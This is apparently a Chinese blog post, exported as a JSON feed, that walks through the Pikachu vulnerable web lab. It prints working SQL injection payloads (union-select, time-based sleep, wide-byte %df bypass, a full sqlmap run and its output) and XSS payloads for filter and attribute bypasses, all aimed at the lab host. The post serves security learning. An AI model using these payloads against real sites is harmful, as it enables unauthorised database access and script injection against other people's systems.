{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0的秘密花园 • All posts by \"pikachu,web靶场\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2020/10/30/dmx/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/",
            "url": "http://example.com/2020/10/30/dmx/pikachu%E5%A4%A7%E5%86%92%E9%99%A9%E9%B8%AD/",
            "title": "pikachu大冒险鸭",
            "date_published": "2020-10-30T03:46:05.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h2 id=\"搜索型注入\"><a class=\"markdownIt-Anchor\" href=\"#搜索型注入\">#</a> 搜索型注入</h2>\n<p><strong>过程</strong></p>\n<p><img src=\"pikachu-sql-001.png\" alt=\"\"></p>\n<p>爆出数据库，确定了是三个字段输出<img src=\"pikachu-sql-002.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xx型注入\"><a class=\"markdownIt-Anchor\" href=\"#xx型注入\">#</a> xx 型注入</h2>\n<p><strong>过程</strong></p>\n<p>我是想看报错信息的，三个单引号，结果莫名其妙就过了</p>\n<p>pyload：<a href=\"http://www.pikachu.com/vul/sqli/sqli_x.php\">http://www.pikachu.com/vul/sqli/sqli_x.php</a><br>\n?name=’’’) union select 1,database() %23<br>\n&amp;submit=%E6%9F%A5%E8%AF%A2</p>\n<p>哦，刚刚试了下，一个单引号就过了，之所以➕），是因为看报错信息的时候发现最后面有一个），所以想到小括号可能没有闭合</p>\n<p><img src=\"pikachu-sql-003.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"insertupdate注入\"><a class=\"markdownIt-Anchor\" href=\"#insertupdate注入\">#</a> &quot;insert/update&quot; 注入</h2>\n<p><strong>过程</strong></p>\n<p>试报错，看具体语句</p>\n<p><img src=\"pikachu-sql-004.png\" alt=\"\"></p>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;,md5(&#x27;a&#x27;),&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>密码随便输，构造用户名 payload，注意时间注入的时候要括号起来，不然会报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#x27;,&#x27;admin&#x27;,&#x27;&#x27;,(select sleep(10)),&#x27;&#x27;,&#x27;&#x27;) # </span><br></pre></td></tr></table></figure>\n<p>实际上差不多数据库执行的语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into a(1,2,3,4,5,6) values(&#x27; admin&#x27;,&#x27;admin&#x27;,&#x27;&#x27;,(select sleep(10)),&#x27;&#x27;,&#x27;&#x27;) # &#x27;,&#x27;md5(admin)&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;  );</span><br></pre></td></tr></table></figure>\n<p>注册成功，最后也不晓得这个注入有劳资用？而且登陆的时候检查密码也是 md5 加密一下的…</p>\n<p>然后登陆的时候，源代码还报错惹</p>\n<p>时隔几天，我突然想起来，既然可以注入那么就能时间盲注进行判断…</p>\n<hr>\n<h2 id=\"delete注入\"><a class=\"markdownIt-Anchor\" href=\"#delete注入\">#</a> delete 注入</h2>\n<p><strong>过程</strong></p>\n<p>发现删除的时候是 get 请求，参数 id，直接 sqlmap 泡一泡：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\othertools\\sqlmap-py&gt;python sqlmap.py -u http://www.pikachu.com/vul/sqli/sqli_del.php?id=57 --dbs --batch</span><br><span class=\"line\">        ___</span><br><span class=\"line\">       __H__</span><br><span class=\"line\"> ___ ___[&quot;]_____ ___ ___  &#123;1.4.9.8#dev&#125;</span><br><span class=\"line\">|_ -| . [.]     | .&#x27;| . |</span><br><span class=\"line\">|___|_  [&#x27;]_|_|_|__,|  _|</span><br><span class=\"line\">      |_|V...       |_|   http://sqlmap.org</span><br><span class=\"line\"></span><br><span class=\"line\">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class=\"line\"></span><br><span class=\"line\">[*] starting @ 10:11:16 /2020-11-04/</span><br><span class=\"line\"></span><br><span class=\"line\">[10:11:16] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class=\"line\">[10:11:17] [INFO] testing connection to the target URL</span><br><span class=\"line\">you have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=3q2hir937ep...ecom1vat5s&#x27;). Do you want to use those [Y/n] Y</span><br><span class=\"line\">sqlmap resumed the following injection point(s) from stored session:</span><br><span class=\"line\">---</span><br><span class=\"line\">Parameter: id (GET)</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class=\"line\">    Payload: id=(SELECT (CASE WHEN (2154=2154) THEN 61 ELSE (SELECT 6834 UNION SELECT 3017) END))</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: error-based</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class=\"line\">    Payload: id=61 AND (SELECT 5347 FROM(SELECT COUNT(*),CONCAT(0x716b717671,(SELECT (ELT(5347=5347,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: time-based blind</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class=\"line\">    Payload: id=61 AND (SELECT 9106 FROM (SELECT(SLEEP(5)))xjCI)</span><br><span class=\"line\">---</span><br><span class=\"line\">[10:11:19] [INFO] the back-end DBMS is MySQL</span><br><span class=\"line\">web application technology: PHP, PHP 7.3.4, Apache 2.4.39</span><br><span class=\"line\">back-end DBMS: MySQL &gt;= 5.0</span><br><span class=\"line\">[10:11:19] [INFO] fetching database names</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;information_schema&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;bookstore&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;dvwa&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;edusys&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;exam&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;fresh&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hotel&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hy&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hy2&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;mysql&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;news&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;pentest&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;performance_schema&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;pikachu&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;store&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;student&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;test&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;vote&#x27;</span><br><span class=\"line\">available databases [18]:</span><br><span class=\"line\">[*] bookstore</span><br><span class=\"line\">[*] dvwa</span><br><span class=\"line\">[*] edusys</span><br><span class=\"line\">[*] exam</span><br><span class=\"line\">[*] fresh</span><br><span class=\"line\">[*] hotel</span><br><span class=\"line\">[*] hy</span><br><span class=\"line\">[*] hy2</span><br><span class=\"line\">[*] information_schema</span><br><span class=\"line\">[*] mysql</span><br><span class=\"line\">[*] news</span><br><span class=\"line\">[*] pentest</span><br><span class=\"line\">[*] performance_schema</span><br><span class=\"line\">[*] pikachu</span><br><span class=\"line\">[*] store</span><br><span class=\"line\">[*] student</span><br><span class=\"line\">[*] test</span><br><span class=\"line\">[*] vote</span><br><span class=\"line\"></span><br><span class=\"line\">[10:11:19] [INFO] fetched data logged to text files under &#x27;C:\\Users\\lenovo\\AppData\\Local\\sqlmap\\output\\www.pikachu.com&#x27;</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"http头注入未解决\"><a class=\"markdownIt-Anchor\" href=\"#http头注入未解决\">#</a> http 头注入（未解决）</h2>\n<p><strong>过程</strong></p>\n<p>用提示里面的账户密码后登录，显示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">你的ip地址:127.0.0.1</span><br><span class=\"line\"></span><br><span class=\"line\">你的user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class=\"line\"></span><br><span class=\"line\">你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"></span><br><span class=\"line\">你的端口（本次连接）:tcp14766</span><br></pre></td></tr></table></figure>\n<p>说明这些头信息可能都被存进数据库了，可以进行 sql 注入</p>\n<p>用 bp 抓到的包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /vul/sqli/sqli_header/sqli_header_login.php HTTP/1.1</span><br><span class=\"line\">Host: www.pikachu.com</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://www.pikachu.com/vul/sqli/sqli_header/sqli_header_login.php</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 34</span><br><span class=\"line\">Origin: http://www.pikachu.com</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: PHPSESSID=1h9tm55rqj71244okk7do3ch0q</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\"></span><br><span class=\"line\">username=a&amp;password=a&amp;submit=Login</span><br></pre></td></tr></table></figure>\n<p>删掉一个加单引号，没报错，用网上的 payload 也不报错，神了个奇：</p>\n<p><img src=\"pikachu-sql-005.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"盲注base-on-boolean\"><a class=\"markdownIt-Anchor\" href=\"#盲注base-on-boolean\">#</a> 盲注 (base  on boolean)</h2>\n<p><strong>过程</strong></p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php</span><br><span class=\"line\">?name=lili&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>正常输出：</p>\n<p><img src=\"pikachu-sql-006.png\" alt=\"\"></p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php</span><br><span class=\"line\">?name=lili&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">您输入的username不存在，请重新输入！</span><br></pre></td></tr></table></figure>\n<p>可能是因为只能输出一个对象，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&#x27; union select database(), &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>爆出数据库，确定是一个对象，两个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:pikachuyour email is: 1</span><br></pre></td></tr></table></figure>\n<p>爆表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&#x27; union select database(), group_concat(table_name)  from information_schema.tables where table_schema = &#x27;pikachu&#x27; and &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>uid:pikachu</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your email is: httpinfo,member,message,users,xssblind</span><br></pre></td></tr></table></figure>\n<p>爆出字段：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>email is: id,userid,ipaddress,useragent,httpaccept,remoteport</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your email is: id,userid,ipaddress,useragent,httpaccept,remoteport</span><br></pre></td></tr></table></figure>\n<p>可以通过 group_concat () 分别输出每个字段所有的值，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=lilijmknh&#x27; union select database(),group_concat(id) from httpinfo where &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:pikachuyour email is: 42,43,44,45,46,47</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"盲注base-on-time未成功实现-500\"><a class=\"markdownIt-Anchor\" href=\"#盲注base-on-time未成功实现-500\">#</a> 盲注 (base on time)，未成功实现 ，500</h2>\n<p>这个就是利用二分法查 ascii 码值，手工注入的话很费时间的把</p>\n<p>靠，他根本就不关心我是谁！我要去看源码了！</p>\n<p>发现果然是盲注，不管是不是查到，都是输出 i don’t care who you are!</p>\n<p><strong>过程</strong></p>\n<p>payload，报 500 了:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_t.php?name=&#x27; or (length(database())&gt;1 and sleep(10)) and &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h2>\n<p><a href=\"https://www.cnblogs.com/Rain99-/p/10583406.html\">详解</a></p>\n<ol>\n<li>字符、字符集<br>\n字符 (character) 是组成字符集 (character set) 的基本单位。对字符赋予一个数值 (encoding) 来确定这个字符在该字符集中的位置。</li>\n<li>UTF8<br>\n 由于 ASCII 表示的字符只有 128 个，因此网络世界的规范是使用 UNICODE 编码，但是用 ASCII 表示的字符使用 UNICODE 并不高效。因此出现了中间格式字符集，被称为通用转换格式，及 UTF (Universal Transformation Format)。</li>\n<li>宽字节<br>\n GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃 ASCII 字符 (一字节) 的现象，即将两个 ascii 字符误认为是一个宽字节字符。</li>\n</ol>\n<p>宽字节注入原理：</p>\n<blockquote>\n<p>GBK 占用两字节</p>\n<p>ASCII 占用一字节</p>\n<p>PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为 “\\”），MYSQL 默认字符集是 GBK 等宽字节字符集。</p>\n<p>大家都知道 % df’ 被 PHP 转义（开启 GPC、用 addslashes 函数，或者 icov 等），单引号被加上反斜杠 \\，变成了 % df\\’，其中 \\ 的十六进制是 %5C ，那么现在  <code>%df\\’</code>  = <code>%df%5c%27</code> ，如果程序的默认字符集是 GBK 等宽字节字符集，则 MySQL 用 GBK 的编码时，会认为  <code>%df%5c</code>  是一个宽字符，也就是 <code>縗</code> ，也就是说：% df\\’ = % df%5c%27 = 縗’，有了单引号就好注入了。</p>\n</blockquote>\n<p><img src=\"https://img2018.cnblogs.com/blog/1335588/201903/1335588-20190323124156168-514841357.png\" alt=\"img\"></p>\n<p><strong>过程</strong></p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name=%df&#x27; or 1=1 %23+&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>\n<p>所有数据输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:1your email is: eyour uid:2your email is: allen@pikachu.comyour uid:3your email is: kobe@pikachu.comyour uid:4your email is: grady@pikachu.comyour uid:5your email is: kevin@pikachu.comyour uid:6your email is: lucy@pikachu.com......</span><br></pre></td></tr></table></figure>\n<hr>\n<h1 id=\"xss\"><a class=\"markdownIt-Anchor\" href=\"#xss\">#</a> XSS</h1>\n<blockquote>\n<p>XSS 漏洞可以用来进行钓鱼攻击，前端 JS 挖矿，用户 cookie 获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制。</p>\n</blockquote>\n<h2 id=\"反射型xssget\"><a class=\"markdownIt-Anchor\" href=\"#反射型xssget\">#</a> 反射型 xss (get)</h2>\n<h3 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h3>\n<p>​\t文本框下方会回显输入的内容，想输万能弹窗 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> ，发现文本框限制了字数，前端直接定位改成 100，成功</p>\n<p><img src=\"pikachu-xss-001.png\" alt=\"\"></p>\n<p>因为为 get 请求，所以输入的参数值会出现在 url 末尾</p>\n<hr>\n<h2 id=\"反射型xsspost大失败\"><a class=\"markdownIt-Anchor\" href=\"#反射型xsspost大失败\">#</a> 反射型 xss (post)（大失败）</h2>\n<p><img src=\"pikachu-xss-002.png\" alt=\"\"></p>\n<p>​\tPOST 请求区别与 GET 请求，POST 请求不能从 URL 让用户向服务器提交数据。所以为了进行注入，需要让用户代替攻击者提交 POST 请求，这就需要攻击者自己搭建站点，然后再站点内写一个 POST 表单，将我们搭建出的连接发给用户，这样就能让用户帮攻击者提交 POST 请求发给存在 XSS 漏洞的中。这样就能窃取到用户的 cookie，就能伪造用户登陆达到破坏的目的。</p>\n<h3 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程</h3>\n<p>但是这后台我没登进去呀～</p>\n<hr>\n<h2 id=\"存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#存储型xss\">#</a> 存储型 xss</h2>\n<h3 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程</h3>\n<p>​\t直接搞个超链接，留言列表点击跳转</p>\n<p><img src=\"pikachu-xss-003.png\" alt=\"\"></p>\n<script>alert(1)</script> 的话，每次刷新页面都会弹窗\n<hr>\n<h2 id=\"dom型\"><a class=\"markdownIt-Anchor\" href=\"#dom型\">#</a> dom 型</h2>\n<p>click 一下，发现超链接的跳转是输入的字符串，所以直接闭合就可</p>\n<h3 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程</h3>\n<p><img src=\"pikachu-xss-004.png\" alt=\"\"></p>\n<p>尝试用双引号闭合的时候，尽然没有作用？？？</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a&quot;&gt;nhhh<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#</span></span></span><br></pre></td></tr></table></figure>\n<p><img src=\"pikachu-xss-005.png\" alt=\"\"></p>\n<p>全部改成单引号 <code>a'&gt;nhhh&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href='#</code> ：</p>\n<p><img src=\"pikachu-xss-006.png\" alt=\"\"></p>\n<p>但是 js 脚本没有生效，因为没有返回给服务器，所以刷新之后更改的也没有了，可以通过 onclick 弹窗:</p>\n<p><code>a' onclick=&quot;alert(1)&quot;&gt;nhhh&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href='#</code></p>\n<p><img src=\"pikachu-xss-007.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"dom型xss-x\"><a class=\"markdownIt-Anchor\" href=\"#dom型xss-x\">#</a> dom 型 xss-x</h2>\n<h3 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程</h3>\n<p>随便输入 a 后点按钮，出现一个超链接，发现这个超链接有一个事件，调用了 domxss () 函数，Ctrl+F 找一下 domxss 看 js 源代码，竟然还有这种明示</p>\n<p><img src=\"pikachu-xss-008.png\" alt=\"\"></p>\n<p>直接输入：’ onclick=“alert (‘xss’)”&gt;</p>\n<p><img src=\"pikachu-xss-009.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xss之盲打\"><a class=\"markdownIt-Anchor\" href=\"#xss之盲打\">#</a> xss 之盲打</h2>\n<h3 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程</h3>\n<p>根据提示登录后台，发现有我们提交的数据（这里只能显示一个我们交的数据！气人），所以前台提交</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>后台就会被弹</p>\n<p>可以利用这个获取 cookie，但是我还是没有试</p>\n<p>(爱鸭，怎么能不试试呢～)</p>\n<hr>\n<h2 id=\"xss之过滤\"><a class=\"markdownIt-Anchor\" href=\"#xss之过滤\">#</a> xss 之过滤</h2>\n<h3 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程</h3>\n<p>经过多次尝试，应是过滤了 &lt; script 和前面所有字符，大小写可以绕过，也可以用<a onclick=\"alert(1)\"></a></p>\n<hr>\n<h2 id=\"xss之htmlspecialcahrs我总是以为自己没绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss之htmlspecialcahrs我总是以为自己没绕过\">#</a> xss 之 htmlspecialcahrs，我总是以为自己没绕过</h2>\n<h3 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程</h3>\n<p>默认不过滤单引号</p>\n<p>payload：</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"xss之href输出\"><a class=\"markdownIt-Anchor\" href=\"#xss之href输出\">#</a> xss 之 href 输出</h2>\n<h3 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程</h3>\n<p>payload:</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javascript:alert(1)</span><br></pre></td></tr></table></figure>\n<p><img src=\"pikachu-xss-011.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xss之js输出\"><a class=\"markdownIt-Anchor\" href=\"#xss之js输出\">#</a> xss 之 js 输出</h2>\n<h3 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程</h3>\n<p>看表单发现 js 有个判断，输入 tmac 会输出一张图片，直接插入 onclick=“alert (1)”</p>\n<p><img src=\"pikachu-xss-012.png\" alt=\"\"></p>\n<p><img src=\"pikachu-xss-010.png\" alt=\"\"></p>\n<p>据说可以闭合，成功弹窗</p>\n<p>payload：</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>闭合后的 js：</p>\n<p><img src=\"pikachu-xss-013.png\" alt=\"\"></p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<p><a 